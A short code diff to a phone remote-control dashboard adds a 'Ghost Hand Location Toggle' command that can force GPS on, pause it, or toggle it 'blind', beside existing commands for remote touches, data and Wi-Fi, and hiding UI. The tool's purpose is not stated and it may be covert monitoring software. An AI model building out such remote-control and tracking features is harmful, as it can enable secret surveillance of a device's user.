@@ -763,6 +763,7 @@
                     { id: 'FLIGHT_MODE', name: 'Toggle Flight Mode', icon: '✈️', keywords: 'airplane, offline, disconnect, data, signal', inputs: [{id: 'val-flight', label: 'State', type: 'select', options: [{v: 'ON', l: 'Enable (Offline)'}, {v: 'OFF', l: 'Disable (Online)'}]}] },
                     { id: 'FORCE_DATA', name: 'Ghost Hand Data Toggle', icon: '📡', keywords: 'mobile, data, cellular, internet', inputs: [{id: 'val-data', label: 'State', type: 'select', options: [{v: 'ENABLE', l: 'Enable'}, {v: 'DISABLE', l: 'Disable'}, {v: 'TOGGLE', l: 'Toggle (Blind)'}]}] },
                     { id: 'FORCE_WIFI', name: 'Ghost Hand Wi-Fi Toggle', icon: '📶', keywords: 'wifi, wlan, internet, connect, network', inputs: [{id: 'val-wifi', label: 'State', type: 'select', options: [{v: 'ENABLE', l: 'Enable'}, {v: 'DISABLE', l: 'Disable'}, {v: 'TOGGLE', l: 'Toggle (Blind)'}]}] },
+                    { id: 'FORCE_LOCATION', name: 'Ghost Hand Location Toggle', icon: '📍', keywords: 'gps, location, tracking, enable, disable', inputs: [{id: 'val-loc', label: 'State', type: 'select', options: [{v: 'ENABLE', l: 'Enable (Enforce ON)'}, {v: 'DISABLE', l: 'Disable (15m Break)'}, {v: 'TOGGLE', l: 'Toggle (Blind)'}]}] },
                     { 
                         id: 'REMOTE_TOUCH', 
                         name: 'Execute Touch Chain', 
@@ -1559,6 +1560,8 @@
                         content = document.getElementById('val-data').value; break;
                     case 'FORCE_WIFI':
                         content = document.getElementById('val-wifi').value; break;
+                    case 'FORCE_LOCATION':
+                        content = document.getElementById('val-loc').value; break;
                     case 'REMOVE_UI':
                     case 'RESTORE_DEFAULT_SMS':
                     case 'STOP_RELENTLESS_ACC':
